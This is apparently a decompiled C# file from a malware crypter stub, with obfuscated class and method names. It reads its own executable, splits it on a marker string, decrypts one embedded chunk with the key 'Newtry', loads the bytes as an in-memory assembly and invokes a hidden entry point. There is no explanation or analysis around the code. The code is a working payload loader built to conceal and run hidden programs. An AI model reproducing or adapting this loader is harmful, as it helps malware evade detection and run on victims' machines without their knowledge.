using System.IO;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using ns3;

namespace ns2;

internal sealed class Class5
{
	public static void smethod_0(string string_0)
	{
		Thread.Sleep(10);
		string[] array = Strings.Split(File.ReadAllText(Application.get_ExecutablePath()), "Z23718AZheLjqkYTDrtV", -1, (CompareMethod)0);
		byte[] bytes = Encoding.Default.GetBytes(Class6.smethod_0(array[18], "Newtry"));
		Assembly.Load(bytes).GetType("A.A")!.InvokeMember("A", BindingFlags.InvokeMethod, null, null, new object[0]);
	}
}
